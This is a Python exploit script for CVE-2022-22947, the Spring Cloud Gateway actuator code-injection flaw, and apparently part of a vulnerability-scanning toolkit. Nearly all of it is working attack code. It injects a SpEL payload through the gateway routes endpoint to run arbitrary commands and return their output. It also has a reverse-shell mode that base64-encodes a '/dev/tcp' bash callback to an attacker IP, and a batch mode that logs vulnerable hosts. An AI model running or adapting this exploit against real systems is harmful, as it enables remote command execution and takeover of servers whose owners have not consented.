#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
import base64
import re
import json
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt

urllib3.disable_warnings()


class Cve_2022_22947:
    def revershell(self, url):
        commond = input(
            "Please input your commond for reverse shell , such as (\"bash -i >& /dev/tcp/192.168.190.177/5000 0>&1\"): \n")
        if "bash" not in commond:
            if not self.batch:
                print("Error!!!")
        else:
            shell = self.bas64(commond)
            self.exec(url, shell)

    def bas64(self, commond):
        shell = commond
        base64shell = base64.b64encode(shell.encode('utf-8'))
        rever_shell = "bash -c {echo," + base64shell.decode('utf-8') + "}|{base64,-d}|{bash,-i}"
        return rever_shell

    def exec(self, url, commond):
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'User-Agent': self.header,
            'Content-Type': 'application/json'
        }

        headers2 = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        payload = '''{\r
          "id": "hacktest",\r
          "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(\\"%s\\")).getInputStream()))}"}\r
            }],\r
          "uri": "http://example.com",\r
          "order": 0\r
        }''' % commond
        try:
            re1 = requests.post(url=url + "/actuator/gateway/routes/hacktest", data=payload, headers=headers1,json=json, verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            re2 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2, verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            re3 = requests.get(url=url + "/actuator/gateway/routes/hacktest", headers=headers2, verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            re4 = requests.delete(url=url + "/actuator/gateway/routes/hacktest", headers=headers2, verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            re5 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2, verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            result = re.findall(r"Result = '.*']", re3.text)
            list1 = []
            if result == list1:
                if not self.batch:
                    print("Result is null!")
                return
            else:
                if not self.batch:
                    result = result[0].replace("\\n", "")
                    print("The commond result is : \n")
                    print(result)
                else:
                    OutPrintInfoSuc("Spring",f"存在漏洞 {url}")
                    with open("./result/spring_2022_22947.txt","a") as w:
                        w.write(f"{url}\n")
        except Exception:
            pass

    def main(self, target):
        self.batch = target["batch_work"]
        b = '''
     ___ _ __  _ __(_)_ __   __ _        ___| | ___  _   _  __| |      ___  __ _ 
    / __| '_ \| '__| | '_ \ / _` |_____ / __| |/ _ \| | | |/ _` |_____/ __|/ _` |
    \__ \ |_) | |  | | | | | (_| |_____| (__| | (_) | |_| | (_| |_____\__ \ (_| |
    |___/ .__/|_|  |_|_| |_|\__, |      \___|_|\___/ \__,_|\__,_|     |___/\__, |
        |_|                 |___/                                             |_|
          _ ____   ____ _____ 
      ___| |  _ \ / ___| ____|
     / _ \ | |_) | |   |  _|  
    |  __/ |  _ <| |___| |___ 
     \___|_|_| \_\\____|_____|


    Usage: python3 CVE-2022-22947.py url
    (If you want to get the reverse shell,please input: shell)
    '''
        if not self.batch:
            print(b)

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Spring", '开始执行Spring漏洞检测...')
            OutPrintInfo("1", "检测漏洞")
            OutPrintInfo("2", "反弹shell")
            choose = Prompt.ask("[b yellow]输入选择")
            if choose == '1':
                commond = Prompt.ask("[b yellow]Please input your commond")
                self.exec(url, commond)
            elif choose == '2':
                self.revershell(url)
        else:
            self.exec(url, "whoami")
        if not self.batch:
            OutPrintInfo("Spring", 'Spring漏洞检测结束')

